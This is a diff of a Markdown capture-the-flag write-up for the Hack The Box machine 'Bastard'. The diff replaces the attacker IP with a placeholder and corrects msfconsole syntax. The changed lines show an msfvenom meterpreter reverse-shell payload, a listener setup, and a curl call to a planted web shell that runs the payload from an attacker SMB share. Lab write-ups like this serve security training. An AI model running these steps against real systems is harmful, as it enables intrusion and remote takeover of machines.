@@ -150,7 +150,7 @@ curl "http://bastard.htb/spread.php?cmd=whoami"
 With msfvenom I generated an executable:
 
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.9 LPORT=8887 -f exe -o shell.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=8887 -f exe -o shell.exe
 ```
 
 I started an smbclient:
@@ -163,16 +163,16 @@ With msfconsole I started a handler:
 
 ```bash
 use exploit/multi/handler
-set LHOST=10.10.16.0
-set LPORT=8887
-set PAYLOAD=windows/meterpreter/reverse_tcp
+set LHOST <IP>
+set LPORT 8887
+set PAYLOAD windows/meterpreter/reverse_tcp
 run
 ```
 
 And then I run, with curl, the executable:
 
 ```bash
-curl "http://bastard.htb/spread.php?cmd=cmd.exe%20%2Fc%20%22%5C%5C10.10.16.9%5Cshares%5Cshell.exe%22"
+curl "http://bastard.htb/spread.php?cmd=cmd.exe%20%2Fc%20%22%5C%5C<IP>%5Cshares%5Cshell.exe%22"
 ```
 
 In the user directory I found the flag.
